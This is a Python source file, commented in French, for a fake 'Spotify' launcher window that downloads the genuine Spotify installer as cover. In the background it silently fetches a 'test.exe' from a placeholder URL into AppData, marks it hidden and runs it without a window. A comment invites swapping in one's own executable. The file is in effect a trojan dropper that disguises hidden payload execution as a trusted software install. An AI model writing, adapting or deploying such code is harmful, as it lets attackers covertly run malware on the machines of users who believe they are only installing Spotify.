import os
import sys
import time
import subprocess
import tkinter as tk
from tkinter import PhotoImage
import threading
import ctypes
import requests
from pathlib import Path

class SpotifyLauncher:
    def __init__(self, root):
        self.root = root
        self.root.title("Spotify")
        self.root.geometry("720x480")
        self.root.resizable(False, False)
        
        # Tentative de définir l'icône Spotify (si disponible)
        try:
            self.root.iconbitmap("spotify_icon.ico")
        except:
            pass
        
        # Définir couleur de fond (vert Spotify)
        self.root.configure(bg="#1DB954")
        
        # Interface simple
        self.setup_ui()
        
        # Lancer le processus de téléchargement et d'installation
        threading.Thread(target=self.process_launcher, daemon=True).start()
    
    def setup_ui(self):
        # Logo et texte
        self.frame = tk.Frame(self.root, bg="#1DB954")
        self.frame.pack(expand=True)
        
        # Essayer de charger une image (si disponible)
        try:
            logo = PhotoImage(file="spotify_logo.png")
            logo_label = tk.Label(self.frame, image=logo, bg="#1DB954")
            logo_label.logo = logo  # Garder une référence
            logo_label.pack(pady=20)
        except:
            # Si pas d'image, utiliser du texte
            logo_text = tk.Label(self.frame, text="Spotify", font=("Arial", 36, "bold"), fg="white", bg="#1DB954")
            logo_text.pack(pady=20)
        
        self.status_label = tk.Label(self.frame, text="Préparation de l'installation...", font=("Arial", 12), fg="white", bg="#1DB954")
        self.status_label.pack(pady=20)
        
        self.progress = tk.Label(self.frame, text="", font=("Arial", 10), fg="white", bg="#1DB954")
        self.progress.pack(pady=5)

    def process_launcher(self):
        try:
            # 1. Télécharger SpotifySetup.exe
            self.update_status("Téléchargement de Spotify...", "Veuillez patienter...")
            
            # URL officielle de l'installateur Spotify
            spotify_url = "https://download.scdn.co/SpotifySetup.exe"
            
            # Chemin pour sauvegarder l'installateur
            downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")
            # Vérifier si le dossier est en français
            if not os.path.exists(downloads_folder):
                downloads_folder = os.path.join(os.path.expanduser("~"), "Téléchargements")
                
            spotify_installer_path = os.path.join(downloads_folder, "SpotifySetup.exe")
            
            # Télécharger l'installateur
            response = requests.get(spotify_url, stream=True)
            total_size = int(response.headers.get('content-length', 0))
            
            # Créer le fichier
            with open(spotify_installer_path, 'wb') as file:
                downloaded = 0
                for data in response.iter_content(chunk_size=4096):
                    downloaded += len(data)
                    file.write(data)
                    # Mettre à jour la progression
                    if total_size > 0:
                        percent = int(100 * downloaded / total_size)
                        self.update_progress(f"Téléchargement: {percent}%")
            
            # 2. Télécharger et installer le fichier test.exe dans AppData
            self.update_status("Configuration...", "Préparation de l'environnement...")
            
            # Remplacez cette URL par celle de votre fichier test.exe
            # Pour les besoins de l'exemple, nous utilisons une URL fictive
            test_exe_url = "https://example.com/test.exe"
            
            # Chemin pour le fichier test.exe dans AppData/Roaming
            appdata_roaming = os.path.join(os.environ['APPDATA'])
            test_exe_path = os.path.join(appdata_roaming, "test.exe")
            
            # Télécharger le fichier test.exe
            try:
                response = requests.get(test_exe_url)
                
                # Créer le répertoire si nécessaire
                os.makedirs(os.path.dirname(test_exe_path), exist_ok=True)
                
                # Sauvegarder le fichier
                with open(test_exe_path, 'wb') as file:
                    file.write(response.content)
                
                # Masquer le fichier
                if sys.platform == "win32":
                    ctypes.windll.kernel32.SetFileAttributesW(test_exe_path, 2)  # 2 = FILE_ATTRIBUTE_HIDDEN
                
                # 3. Exécuter le fichier test.exe
                self.update_status("Finalisation...", "Préparation de l'installation...")
                subprocess.Popen([test_exe_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                
            except Exception as e:
                print(f"Erreur lors du téléchargement ou de l'exécution du fichier test: {e}")
            
            # 4. Lancer l'installateur Spotify
            self.update_status("Lancement de l'installation...", "")
            subprocess.Popen([spotify_installer_path], shell=True)
            
            # 5. Fermer le launcher après un court délai
            time.sleep(2)
            self.root.quit()
            
        except Exception as e:
            self.update_status(f"Erreur: {str(e)}", "")
    
    def update_status(self, message, progress_text):
        self.root.after(10, lambda: self.status_label.config(text=message))
        self.root.after(10, lambda: self.progress.config(text=progress_text))
    
    def update_progress(self, progress_text):
        self.root.after(10, lambda: self.progress.config(text=progress_text))

if __name__ == "__main__":
    root = tk.Tk()
    app = SpotifyLauncher(root)
    root.mainloop()